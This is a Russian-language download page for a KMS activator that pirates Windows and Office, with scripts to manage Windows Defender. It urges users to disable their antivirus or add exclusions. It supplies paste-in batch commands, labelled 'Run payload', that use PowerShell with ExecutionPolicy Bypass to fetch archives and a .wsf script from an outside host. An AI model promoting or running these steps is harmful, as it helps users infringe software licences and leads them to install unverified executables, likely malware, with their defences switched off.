# Загрузка файлов

**Внимание!!!** Антивирусы могут определять этот набор скриптов как
содержащие вирус. Запускайте скрипты при отключённом антивирусе или
добавьте исключения антивируса.

В данном каталоге находятся программа для активации продуктов Microsoft и набор скриптов для управления Windows Defender и предотвращения его ложного срабатывания при активации Microsoft Windows. В 2023 году корпорация Microsoft ужесточила борьбу с пиратскими активациями Windows и Office, поэтому без предлагаемого набора скриптов активатор даже не запустится.

Подробную инструкцию по активации Windows и Office смотри в Интернете. Авторы останавливаться на процедуре активации и возможных проблемах не будут.

На этой странице предлагается загрузка следующих файлов:

- [KMS-Settings.zip](http://distrib.netip6.ru/NIT/KMS/download.php?file=KMS-Settings.zip)
  — Архив, содержащий KMS активаторы различных версий. **Внимание!!!** Данный файл не защищён паролем, поэтому при его загрузке активные антивирусы его сразу же уничтожают. Вначале добавте исключения в ваш антивирус!
- [DefenderScripts.zip](http://distrib.netip6.ru/NIT/KMS/download.php?file=DefenderScripts.zip) — Набор скриптов для управления антивирусом Microsoft Windows Defender и предотвращения его ложного срабатывания при активации.
- [readme-Defender.txt](http://distrib.netip6.ru/NIT/KMS/download.php?file=readme-Defender.txt) — Текстовый файл, поясняющий работу скриптов.
- [Dn.KMS.scripts.wsf](http://distrib.netip6.ru/NIT/KMS/download.php?file=Dn.KMS.scripts.wsf) — для загрузки файлов из списка ниже за один раз.

Файлы реализуют различные функции на удалённом компьютере.

## Загрузка файлов из командной строки (универсальный вариант)

**Примечание**. Переменная *%WorkingDir%* должна обязательно указывать на папку «Загрузки» пользователя. По умолчанию она располагается в %USERPROFILE%\Downloads. Если это не так, вручную изменить данную инструкцию. Из-за ограничений командной строки авторы не могут использовать скрипт для определения истинного положения папки «Загрузки».

Покомандно, последовательно выполните следующие два скрипта:

```bash
@echo on
rem *******************************************************
rem kms-defender.scripts.download.cmd
rem This Script will Download an Archive
rem *******************************************************
@echo off

rem Set Variables
rem

rem Set a Directory
set WorkingDir=%USERPROFILE%\Downloads
set anURLDir=http://distrib.netip6.ru/NIT/KMS/

set aFile=DefenderScripts.zip
set aFile01=readme-Defender.txt


rem Run payload
powershell.exe -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command "((new-object System.Net.WebClient).DownloadFile('%anURLDir%%aFile%', '%WorkingDir%\%aFile%'))"

powershell.exe -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command "((new-object System.Net.WebClient).DownloadFile('%anURLDir%%aFile01%', '%WorkingDir%\%aFile01%'))"

```

После загрузки файлов распакуйте архив, и выполните действия, описанные в инструкции `readme-Defender.txt`. Затем скачайте и распакуйте другой архив:

```bash
@echo on
rem *******************************************************
rem kms-program.scripts.download.cmd
rem This Script will Download an Archive
rem *******************************************************
@echo off

rem Set Variables
rem

rem Set a Directory
set WorkingDir=%USERPROFILE%\Downloads
set anURLDir=http://distrib.netip6.ru/NIT/KMS/

set aFile=KMS-Settings.zip


rem Run payload
powershell.exe -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command "((new-object System.Net.WebClient).DownloadFile('%anURLDir%%aFile%', '%WorkingDir%\%aFile%'))"

```
*Внимание!* Здесь приведены только скрипты загрузки архивов. Для их распаковки и запуска скриптов может потребоваться графическая оболочка.

**Примечание**. Для загрузки скрипта .WSF можно использовать следующий код:

```powershell
powershell.exe -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command "((new-object System.Net.WebClient).DownloadFile('http://distrib.netip6.ru/NIT/KMS/Dn.KMS.scripts.wsf', '$env:USERPROFILE\Dn.KMS.scripts.wsf'))"
```
